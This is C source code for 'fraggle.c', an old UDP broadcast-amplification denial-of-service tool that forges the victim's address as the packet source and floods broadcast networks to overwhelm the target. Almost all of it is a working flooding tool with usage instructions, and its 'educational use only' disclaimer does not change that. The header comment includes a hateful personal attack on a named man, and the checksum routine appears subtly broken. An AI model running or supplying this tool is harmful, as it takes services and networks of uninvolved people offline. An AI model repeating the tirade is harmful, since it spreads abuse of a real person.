/*
 *  fraggle.c by TFreak
 *
 *  This is basically smurf.c with a udp twist.  There are _many_ interesting
 *  things you can do with this program, I suggest you experiment with it.
 *
 *  Cloud 9:
 *    > head -19 smurf4.c | tail -10
 *    > Tool for providing the world with quality insight and music
 *    > #conflict for being the best 13 year old wanna be clueful but
 *      i still run win95 on my daddy's computer so i'll flood some
 *      efnet servers to make up for my small penis size and lack of
 *      sex packet kiddies the internet has ever seen!
 *    > Dianora for not treating me like the above (whats it like to
 *      be on this side of the greets Di? 8))
 *    > GS Admin Staff -- face it, we rock.  I have never worked with a
 *      more competant bunch of individuals.  You are all great people
 *      as well as great personal friends, thank you for the opportunity
 *      to live, work and grow with you.
 *    > My kitty for falling asleep in my lap.  Aww, look at the pretty
 *      kitty-witty!
 *    > Everyone whom I've ever loved, will love, and will love again.
 *
 *  Circle 9:
 *    < myname (sed 's/author/myname/g' exploit.c > myname.c)
 *    < #conflict (see above)
 *    < Myself (I should have learned the first time)
 *    .. and of course ..
 *    < Bill Robbins for being the most arrogant, incompetent and
 *      ignorant fool I have ever had the displeasure of crossing
 *      paths with.  You will never be anything more than a waste
 *      of flesh and a disgrace to everyone.  I spit on your dilapidated
 *      and pathetic existance.  It is my sincere wish that you live
 *      a life of pain, and die a worthless and senile old man,
 *      remembered only by the hatred in which you were bred upon.
 *
 *  Disclaimer:
 *     I cannot and will not be held responsible nor legally bound for the
 *     malicious activities of individuals who come into possession of this
 *     program and I refuse to provide help or support of any kind and do NOT
 *     condone or promote use of this program to deny service to anyone or any
 *     machine.  This is for educational use only. Please don't abuse this.
 *
 *  "Love is much more evil than hate will ever be ..."
 */

#include <arpa/inet.h>
#include <ctype.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

struct pktinfo
{
    int ps;
    int src;
    int dst;
};

void fraggle (int, struct sockaddr_in *, u_long dest, struct pktinfo *);
void sigint (int);
unsigned short checksum (u_short *, int);

int main (int argc, char *argv[])
{
    struct sockaddr_in sin;
    struct hostent *he;
    struct pktinfo p;
    int s, num, delay, n, cycle;
    char **bcast = malloc(1024), buf[32];
    FILE *bfile;

    /* banner */
    fprintf(stderr, "\nfraggle.c by TFreak\n\n");

    /* capture ctrl-c */
    signal(SIGINT, sigint);

    /* check for enough cmdline args */
    if (argc < 5)
    {
        fprintf(stderr, "usage: %s <target> <bcast file> <num packets> "
                        "<packet delay> [dstport] [srcport] [psize] \n\n"
                        "target\t\t= address to hit\n"
                        "bcast file\t= file containing broadcast addrs\n"
                        "num packets\t= send n packets (n = 0 is constant)\n"
                        "packet delay\t= usleep() between packets (in ms)\n"
                        "dstport\t\t= port to hit (default 7)\n"
                        "srcport\t\t= source port (0 for random)\n"
                        "ps\t\t= packet size\n\n",
                        argv[0]);
        exit(-1);
    }

    /* get port info */
    if (argc >= 6)
        p.dst = atoi(argv[5]);
    else
        p.dst = 7;
    if (argc >= 7)
        p.src = atoi(argv[6]);
    else
        p.src = 0;

    /* packet size redundant if not using echo port */
    if (argc >= 8)
        p.ps = atoi(argv[7]);
    else
        p.ps = 1;

    /* other variables */
    num = atoi(argv[3]);
    delay = atoi(argv[4]);

    /* resolve host */
    if (isdigit(*argv[1]))
        sin.sin_addr.s_addr = inet_addr(argv[1]);
    else
    {
        if ((he = gethostbyname(argv[1])) == NULL)
        {
            fprintf(stderr, "Can't resolve hostname!\n\n");
            exit(-1);
        }

        memcpy( (caddr_t) &sin.sin_addr, he->h_addr, he->h_length);
    }
    sin.sin_family = AF_INET;
    sin.sin_port = htons(0);

    /* open bcast file and build array */
    if ((bfile = fopen(argv[2], "r")) == NULL)
    {
        perror("opening broadcast file");
        exit(-1);
    }
    n = 0;
    while (fgets(buf, sizeof buf, bfile) != NULL)
    {
        buf[strlen(buf) - 1] = 0;
        if (buf[0] == '#' || buf[0] == '\n' || ! isdigit(buf[0]))
            continue;
        bcast[n] = malloc(strlen(buf) + 1);
        strcpy(bcast[n], buf);
        n++;
    }
    bcast[n] = '\0';
    fclose(bfile);

    /* check for addresses */
    if (!n)
    {
        fprintf(stderr, "Error:  No valid addresses in file!\n\n");
        exit(-1);
    }

    /* create our raw socket */
    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) <= 0)
    {
        perror("creating raw socket");
        exit(-1);
    }

    printf("Flooding %s (. = 25 outgoing packets)\n", argv[1]);

    for (n = 0, cycle = 0; n < num || !num; n++)
    {
        if (!(n % 25))
        {
            printf(".");
            fflush(stdout);
        }

        srand(time(NULL) * rand() * getpid());

        fraggle(s, &sin, inet_addr(bcast[cycle]), &p);
        if (bcast[++cycle] == NULL)
            cycle = 0;
        usleep(delay);
    }

    sigint(0);
}

void fraggle (int s, struct sockaddr_in *sin, u_long dest, struct pktinfo *p)
{
    struct iphdr *ip;
    struct udphdr *udp;
    char *packet;
    int r;

    packet = malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + p->ps);
    ip = (struct iphdr *)packet;
    udp = (struct udphdr *) (packet + sizeof(struct iphdr));

    memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr) + p->ps);

    /* ip header */
    ip->protocol = IPPROTO_UDP;
    ip->saddr = sin->sin_addr.s_addr;
    ip->daddr = dest;
    ip->version = 4;
    ip->ttl = 255;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + p->ps);
    ip->ihl = 5;
    ip->frag_off = 0;
    ip->check = checksum((u_short *)ip, sizeof(struct iphdr));

    /* udp header */
    udp->len = htons(sizeof(struct udphdr) + p->ps);
    udp->dest = htons(p->dst);
    if (!p->src)
        udp->source = htons(rand());
    else
        udp->source = htons(p->src);

    /* send it on its way */
    r = sendto(s, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + p->ps,
               0, (struct sockaddr *) sin, sizeof(struct sockaddr_in));
    if (r == -1)
    {
        perror("\nSending packet");
        exit(-1);
    }

    free(packet);               /* free willy 2! */
}

unsigned short checksum (u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1)
    {
        sum += *w++;
        nleft--;
    }

    if (nleft == 1)
    {
        *(u_char *) (&answer) = *(u_char *) w;
        sum += answer;
    }

    sum = (sum >> 17) + (sum & 0xffff);
    sum += (sum >> 17);
    answer = -sum;
    return (answer);
}

void sigint (int ignoremewhore)
{
    fprintf(stderr, "\nDone!\n\n");
    exit(0);
}
